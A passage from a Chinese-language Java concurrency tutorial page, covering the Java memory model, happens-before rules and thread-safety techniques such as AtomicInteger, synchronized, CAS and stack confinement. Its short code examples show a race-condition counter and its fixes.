operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    ThreadUnsafeExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadUnsafeExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> CountDownLatch countDownLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>threadSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threadSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            example<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    countDownLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">997</span></code></pre><h1 id="十、Java-内存模型"><a href="#十、Java-内存模型" class="headerlink" title="十、Java 内存模型"></a>十、Java 内存模型</h1><p>Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。</p><h2 id="主内存与工作内存"><a href="#主内存与工作内存" class="headerlink" title="主内存与工作内存"></a>主内存与工作内存</h2><p>处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。</p><p>加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/68778c1b-15ab-4826-99c0-3b4fd38cb9e9.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/68778c1b-15ab-4826-99c0-3b4fd38cb9e9.png" alt="img"></a></p><p>所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。</p><p>线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/47358f87-bc4c-496f-9a90-8d696de94cee.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/47358f87-bc4c-496f-9a90-8d696de94cee.png" alt="img"></a></p><h2 id="内存间交互操作"><a href="#内存间交互操作" class="headerlink" title="内存间交互操作"></a>内存间交互操作</h2><p>Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/536c6dfd-305a-4b95-b12c-28ca5e8aa043.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/536c6dfd-305a-4b95-b12c-28ca5e8aa043.png" alt="img"></a></p><ul><li>read：把一个变量的值从主内存传输到工作内存中</li><li>load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中</li><li>use：把工作内存中一个变量的值传递给执行引擎</li><li>assign：把一个从执行引擎接收到的值赋给工作内存的变量</li><li>store：把工作内存的一个变量的值传送到主内存中</li><li>write：在 store 之后执行，把 store 得到的值放入主内存的变量中</li><li>lock：作用于主内存的变量</li><li>unlock</li></ul><h2 id="内存模型三大特性"><a href="#内存模型三大特性" class="headerlink" title="内存模型三大特性"></a>内存模型三大特性</h2><h3 id="1-原子性"><a href="#1-原子性" class="headerlink" title="1. 原子性"></a>1. 原子性</h3><p>Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。</p><p>有一个错误认识就是，int 等原子性的类型在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。</p><p>为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。</p><p>下图演示了两个线程同时对 cnt 进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入旧值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ef8eab00-1d5e-4d99-a7c2-d6d68ea7fe92.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ef8eab00-1d5e-4d99-a7c2-d6d68ea7fe92.png" alt="img"></a></p><p>AtomicInteger 能保证多个线程修改的原子性。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/952afa9a-458b-44ce-bba9-463e60162945.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/952afa9a-458b-44ce-bba9-463e60162945.png" alt="img"></a></p><p>使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> AtomicInteger cnt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cnt<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> cnt<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> threadSize <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    AtomicExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 只修改这条语句</span>    <span class="token keyword">final</span> CountDownLatch countDownLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>threadSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threadSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            example<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    countDownLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">1000</span></code></pre><p>除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的原子性。它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AtomicSynchronizedExample</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cnt<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token keyword">int</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> cnt<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>    <span class="token keyword">final</span> <span class="token keyword">int</span> threadSize <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span>    AtomicSynchronizedExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicSynchronizedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">final</span> CountDownLatch countDownLatch <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CountDownLatch</span><span class="token punctuation">(</span>threadSize<span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> threadSize<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            example<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            countDownLatch<span class="token punctuation">.</span><span class="token function">countDown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    countDownLatch<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>example<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">1000</span></code></pre><h3 id="2-可见性"><a href="#2-可见性" class="headerlink" title="2. 可见性"></a>2. 可见性</h3><p>可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。</p><p>主要有有三种实现可见性的方式：</p><ul><li>volatile</li><li>synchronized，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。</li><li>final，被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。</li></ul><p>对前面的线程不安全示例中的 cnt 变量使用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。</p><h3 id="3-有序性"><a href="#3-有序性" class="headerlink" title="3. 有序性"></a>3. 有序性</h3><p>有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。在 Java 内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。</p><p>volatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。</p><p>也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。</p><h2 id="先行发生原则"><a href="#先行发生原则" class="headerlink" title="先行发生原则"></a>先行发生原则</h2><p>上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。</p><h3 id="1-单一线程原则"><a href="#1-单一线程原则" class="headerlink" title="1. 单一线程原则"></a>1. 单一线程原则</h3><blockquote><p>Single Thread rule</p></blockquote><p>在一个线程内，在程序前面的操作先行发生于后面的操作。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/single-thread-rule.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/single-thread-rule.png" alt="img"></a></p><h3 id="2-管程锁定规则"><a href="#2-管程锁定规则" class="headerlink" title="2. 管程锁定规则"></a>2. 管程锁定规则</h3><blockquote><p>Monitor Lock Rule</p></blockquote><p>一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/monitor-lock-rule.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/monitor-lock-rule.png" alt="img"></a></p><h3 id="3-volatile-变量规则"><a href="#3-volatile-变量规则" class="headerlink" title="3. volatile 变量规则"></a>3. volatile 变量规则</h3><blockquote><p>Volatile Variable Rule</p></blockquote><p>对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/volatile-variable-rule.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/volatile-variable-rule.png" alt="img"></a></p><h3 id="4-线程启动规则"><a href="#4-线程启动规则" class="headerlink" title="4. 线程启动规则"></a>4. 线程启动规则</h3><blockquote><p>Thread Start Rule</p></blockquote><p>Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/thread-start-rule.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/thread-start-rule.png" alt="img"></a></p><h3 id="5-线程加入规则"><a href="#5-线程加入规则" class="headerlink" title="5. 线程加入规则"></a>5. 线程加入规则</h3><blockquote><p>Thread Join Rule</p></blockquote><p>Thread 对象的结束先行发生于 join() 方法返回。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/thread-join-rule.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/thread-join-rule.png" alt="img"></a></p><h3 id="6-线程中断规则"><a href="#6-线程中断规则" class="headerlink" title="6. 线程中断规则"></a>6. 线程中断规则</h3><blockquote><p>Thread Interruption Rule</p></blockquote><p>对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 interrupted() 方法检测到是否有中断发生。</p><h3 id="7-对象终结规则"><a href="#7-对象终结规则" class="headerlink" title="7. 对象终结规则"></a>7. 对象终结规则</h3><blockquote><p>Finalizer Rule</p></blockquote><p>一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。</p><h3 id="8-传递性"><a href="#8-传递性" class="headerlink" title="8. 传递性"></a>8. 传递性</h3><blockquote><p>Transitivity</p></blockquote><p>如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。</p><h1 id="十一、线程安全"><a href="#十一、线程安全" class="headerlink" title="十一、线程安全"></a>十一、线程安全</h1><p>多个线程不管以何种方式访问某个类，并且在主调代码中不需要进行同步，都能表现正确的行为。</p><p>线程安全有以下几种实现方式：</p><h2 id="不可变"><a href="#不可变" class="headerlink" title="不可变"></a>不可变</h2><p>不可变（Immutable）的对象一定是线程安全的，不需要再采取任何的线程安全保障措施。只要一个不可变的对象被正确地构建出来，永远也不会看到它在多个线程之中处于不一致的状态。多线程环境下，应当尽量使对象成为不可变，来满足线程安全。</p><p>不可变的类型：</p><ul><li>final 关键字修饰的基本数据类型</li><li>String</li><li>枚举类型</li><li>Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的原子类 AtomicInteger 和 AtomicLong 则是可变的。</li></ul><p>对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ImmutableExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> unmodifiableMap <span class="token operator">=</span> Collections<span class="token punctuation">.</span><span class="token function">unmodifiableMap</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">;</span>        unmodifiableMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>Exception in thread <span class="token string">"main"</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>UnsupportedOperationException    at java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Collections$UnmodifiableMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>Collections<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">1457</span><span class="token punctuation">)</span>    at ImmutableExample<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span>ImmutableExample<span class="token punctuation">.</span>java<span class="token operator">:</span><span class="token number">9</span><span class="token punctuation">)</span></code></pre><p>Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> V <span class="token function">put</span><span class="token punctuation">(</span>K key<span class="token punctuation">,</span> V value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnsupportedOperationException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="互斥同步"><a href="#互斥同步" class="headerlink" title="互斥同步"></a>互斥同步</h2><p>synchronized 和 ReentrantLock。</p><h2 id="非阻塞同步"><a href="#非阻塞同步" class="headerlink" title="非阻塞同步"></a>非阻塞同步</h2><p>互斥同步最主要的问题就是线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步。</p><p>互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施，那就肯定会出现问题。无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。</p><h3 id="1-CAS"><a href="#1-CAS" class="headerlink" title="1. CAS"></a>1. CAS</h3><p>随着硬件指令集的发展，我们可以使用基于冲突检测的乐观并发策略：先进行操作，如果没有其它线程争用共享数据，那操作就成功了，否则采取补偿措施（不断地重试，直到成功为止）。这种乐观的并发策略的许多实现都不需要将线程阻塞，因此这种同步操作称为非阻塞同步。</p><p>乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。CAS 指令需要有 3 个操作数，分别是内存地址 V、旧的预期值 A 和新值 B。当执行操作时，只有当 V 的值等于 A，才将 V 的值更新为 B。</p><h3 id="2-AtomicInteger"><a href="#2-AtomicInteger" class="headerlink" title="2. AtomicInteger"></a>2. AtomicInteger</h3><p>J.U.C 包里面的整数原子类 AtomicInteger 的方法调用了 Unsafe 类的 CAS 操作。</p><p>以下代码使用了 AtomicInteger 执行了自增的操作。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> AtomicInteger cnt <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicInteger</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cnt<span class="token punctuation">.</span><span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>以下代码是 incrementAndGet() 的源码，它调用了 Unsafe 的 getAndAddInt() 。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">incrementAndGet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> unsafe<span class="token punctuation">.</span><span class="token function">getAndAddInt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> valueOffset<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>以下代码是 getAndAddInt() 源码，var1 指示对象内存地址，var2 指示该字段相对对象内存地址的偏移，var4 指示操作需要加的数值，这里为 1。通过 getIntVolatile(var1, var2) 得到旧的预期值，通过调用 compareAndSwapInt() 来进行 CAS 比较，如果该字段内存地址中的值等于 var5，那么就更新内存地址为 var1+var2 的变量为 var5+var4。</p><p>可以看到 getAndAddInt() 在一个循环中进行，发生冲突的做法是不断的进行重试。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token function">getAndAddInt</span><span class="token punctuation">(</span>Object var1<span class="token punctuation">,</span> <span class="token keyword">long</span> var2<span class="token punctuation">,</span> <span class="token keyword">int</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> var5<span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">{</span>        var5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getIntVolatile</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">compareAndSwapInt</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> var5 <span class="token operator">+</span> var4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> var5<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="3-ABA"><a href="#3-ABA" class="headerlink" title="3. ABA"></a>3. ABA</h3><p>如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。</p><p>J.U.C 包提供了一个带有标记的原子引用类 AtomicStampedReference 来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。</p><h2 id="无同步方案"><a href="#无同步方案" class="headerlink" title="无同步方案"></a>无同步方案</h2><p>要保证线程安全，并不是一定就要进行同步。如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性。</p><h3 id="1-栈封闭"><a href="#1-栈封闭" class="headerlink" title="1. 栈封闭"></a>1. 栈封闭</h3><p>多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在虚拟机栈中，属于线程私有的。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StackClosedExample</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add100</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            cnt<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>    StackClosedExample example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StackClosedExample</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ExecutorService executorService <span class="token operator">=</span> Executors<span class="token punctuation">.</span><span class="token function">newCachedThreadPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> example<span class="token punctuation">.</span><span class="token function">add100</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> example<span class="token punctuation">.</span><span class="token function">add100</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token number">100</span><span class="token number">100</span></code></pre><h3 id="2-线程本地存储（Thread-Local-Storage）"><a href="#2-线程本地存储（Thread-Local-Storage）" class="headerlink" title="2. 线程本地存储（Thread 